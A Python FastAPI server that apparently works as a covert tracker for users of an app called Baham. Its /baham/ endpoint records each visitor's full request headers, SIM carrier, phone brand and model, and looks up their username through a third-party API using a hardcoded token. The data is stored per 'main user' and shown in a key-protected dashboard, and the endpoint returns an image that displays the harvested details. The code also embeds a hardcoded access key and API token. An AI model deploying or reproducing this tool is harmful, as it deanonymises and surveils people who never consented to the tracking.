from fastapi import FastAPI, Request
from fastapi.responses import FileResponse, HTMLResponse, StreamingResponse
from io import BytesIO
from json import load, dump, dumps
from requests import post
from os import path
import PIL.Image as Image
from PIL import ImageDraw
from secrets import compare_digest
from random import randint, choice
from string import ascii_letters

KEY = 'Spidey2257'
app = FastAPI()

def generate_image(sim, brand, model, ip):

    text_color = (0, 0, 0)
    img = Image.new('RGB', (800, 600), (223, 228, 251))

    d = ImageDraw.Draw(img)

    d.text((170, 90), 'Your information :', font_size=40, fill=(235, 58, 52))
    d.text((120, 160), 'Simcard : '+'Hamrah Aval' if sim.upper() in ('IR-MCI', 'MCI') else sim, font_size=40, fill=text_color)
    d.text((120, 230), 'Brand     : '+brand, font_size=40, fill=text_color)
    d.text((120, 300), 'Model     : '+model, font_size=40, fill=text_color)
    d.text((120, 370), 'IP              : '+ip, font_size=40, fill=text_color)

    img_pil = img

    img_bytes = BytesIO()
    img_pil.save(img_bytes, format='PNG')
    img_bytes.seek(0)

    return img_bytes.getvalue()

def render_html(info_dict):
    try:
        with open("uh.json") as f:
            uh_dict = load(f)
    except:
        uh_dict = {}

    main_users = list(info_dict.keys())

    html = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Baham Dashboard</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body { margin:0; padding:20px; font-family: Arial,sans-serif; background:#0f172a; color:#e5e7eb; }
h1 { color:#38bdf8; }
.card { background:#020617; padding:20px; border-radius:12px; box-shadow:0 5px 20px rgba(0,0,0,0.5); margin-bottom:20px;}
.controls { margin-bottom:15px; display:flex; gap:10px; flex-wrap:wrap; }
select,input { padding:6px 12px; border-radius:8px; border:1px solid #1e293b; background:#020617; color:#e5e7eb; }
table { width:100%; border-collapse:collapse; margin-top:15px; }
th,td { padding:10px; border-bottom:1px solid #1e293b; text-align:left; }
th { background:#020617; color:#94a3b8; }
tbody tr:hover { background: rgba(56,189,248,0.08); }
button { background:transparent; border:1px solid #38bdf8; color:#38bdf8; border-radius:8px; padding:4px 10px; cursor:pointer; }
button:hover { background:rgba(56,189,248,0.15); }
.modal { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.7); align-items:center; justify-content:center; }
.modal-content { background:#020617; padding:20px; border-radius:12px; max-width:800px; max-height:80vh; overflow:auto; }
.modal-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:10px; }
pre { background:#020617; border:1px solid #1e293b; padding:15px; border-radius:8px; color:#e5e7eb; white-space:pre-wrap; }
</style>
<script>
const INFO_DATA = """ + dumps(info_dict, indent=2) + """;
const UH_DATA = """ + dumps(uh_dict, indent=2) + """; 

let currentMainUser = '""" + main_users[0] + """';

function renderTable() {
    const container = document.getElementById("tablesContainer");
    container.innerHTML = "";

    const items = [...INFO_DATA[currentMainUser]].reverse();

    let tableHTML = `<div class="card">
    <h2>User: ${currentMainUser}</h2>
    <div class="controls">
        <input id="search_input" onkeyup="filterTable()" placeholder="Search in ${currentMainUser}...">
    </div>
    <table id="user_table">
    <thead>
        <tr><th>Username</th><th>SIM</th><th>Brand</th><th>Model</th><th>Actions</th></tr>
    </thead>
    <tbody>
    `;

    for (const item of items) {
        tableHTML += `<tr>
        <td>${item.username}</td>
        <td>${item.sim}</td>
        <td>${item.brand}</td>
        <td>${item.model}</td>
        <td><button onclick="showNagent('${currentMainUser}','${item.username}')">Show Nagent</button></td>
        </tr>`;
    }
    tableHTML += "</tbody></table></div>";
    container.innerHTML = tableHTML;
}

function filterTable() {
    const q = document.getElementById("search_input").value.toLowerCase();
    document.querySelectorAll("#user_table tbody tr").forEach(row => {
        row.style.display = row.innerText.toLowerCase().includes(q) ? '' : 'none';
    });
}

function switchUser() {
    const sel = document.getElementById("mainUserSelect");
    currentMainUser = sel.value;
    renderTable();
}

function showNagent(mainUser, username) {
    let nagentData = "No nagent found for this user.";
    if(UH_DATA[mainUser] && UH_DATA[mainUser][username]){
        nagentData = UH_DATA[mainUser][username];
    }
    openModal("Nagent for " + username, nagentData);
}

function openModal(title, data) {
    document.getElementById("modalTitle").innerText = title;
    if(typeof data === 'object'){
        document.getElementById("modalContent").textContent = JSON.stringify(data, null, 2);
    } else {
        document.getElementById("modalContent").textContent = data;
    }
    document.getElementById("modal").style.display = "flex";
}

function closeModal() {
    document.getElementById("modal").style.display = "none";
}

window.onload = function() {
    const sel = document.getElementById("mainUserSelect");
    for (const u of Object.keys(INFO_DATA)) {
        sel.innerHTML += `<option value="${u}">${u}</option>`;
    }
    renderTable();
}
</script>
</head>
<body>
<h1>📊 Baham Dashboard</h1>
<div class="controls">
<label for="mainUserSelect">Select Main User: </label>
<select id="mainUserSelect" onchange="switchUser()">
</select>
</div>
<div id="tablesContainer"></div>

<div class="modal" id="modal">
<div class="modal-content">
<div class="modal-header">
<h3 id="modalTitle"></h3>
<button onclick="closeModal()">Close</button>
</div>
<pre id="modalContent"></pre>
</div>
</div>
</body>
</html>
"""
    return HTMLResponse(html)


def getUser(userid):
    data = {
        'userid': userid,
        'myid': 25908333,
        'fnname': 'getuserprofile',
        'Token': '31026173|3598caba9c29c6885b4bface747d09add56b6e698f71c6e8b5370fcde5694d22dfff11367184805ddfec010817c182ba024e25397eb69e9c956094994dc09291'
    }
    try:
        r = post('http://ir-android.com//joke_city/v29/index.php', data=data, timeout=5)
        return {'username': r.json()['Pic']['user_username']}
    except Exception as e:
        print("getUser failed:", e)
        return {'username': 'omid'}

def add_by_user(filename: str, main_user: str, username: str, data):
    if not path.exists(filename):
        content = {}
    else:
        with open(filename, "r") as f:
            content = load(f)

    if not isinstance(content, dict):
        content = {}

    content.setdefault(main_user, {})
    content[main_user][username] = data

    with open(filename, "w") as f:
        dump(content, f, indent=4, ensure_ascii=False)

def get_uh():
    with open('uh.json') as i:
        return load(i)

def get_info():
    with open('info.json') as i:
        return load(i)

def get_headers():
    with open('h.json') as i:
        return load(i)

@app.get('/baham/')
def process_headers(request: Request, username: str):
    info = None
    # try:
    headers = dict(request.headers)
    userid = headers.get('stat-userid')
    if not userid:
        userid = headers.get('stat_userid')
    if userid:
        api_username = getUser(userid)['username']
    else:
        api_username = ''.join(choice(ascii_letters) for _ in range(randint(10, 20)))+'_CANT_GET_USERNAME'

    agent = headers['nagent'].split('/')

    info = {
        'sim': agent[5],
        'brand': agent[6],
        'model': agent[7],
        'username': api_username
    }

    add_by_user('h.json', username, api_username, headers)
    add_by_user('uh.json', username, api_username, headers['nagent'])
    add_by_user('info.json', username, api_username, info)

    # except Exception as e:
    #     print("error:", e)

    if info:
        img_bytes = generate_image(
            info['sim'],
            info['brand'],
            info['model'],
            headers.get('my-ip', 'unknown')
        )
        return StreamingResponse(BytesIO(img_bytes), media_type='image/png')

    return FileResponse('x.png')


@app.get('/get_info')
def getInformation(key: str):
    if not compare_digest(key, KEY):
        return {"ok": False}

    normalized_info = {}
    for user, val in get_info().items():
        normalized_info[user] = list(val.values())

    return render_html(normalized_info)

@app.get('/get_headers')
async def getHeaders(key: str):
    if not compare_digest(key, KEY):
        return {'ok': False}
    return {'result': get_headers()}

@app.get('/get_info2')
async def getInformation2(key: str):
    if not compare_digest(key, KEY):
        return {'ok': False}
    return {'result': get_info()}

@app.get('/get_uh')
async def getNagentAndUsername(key: str):
    if not compare_digest(key, KEY):
        return {'ok': False}
    return {'result': get_uh()}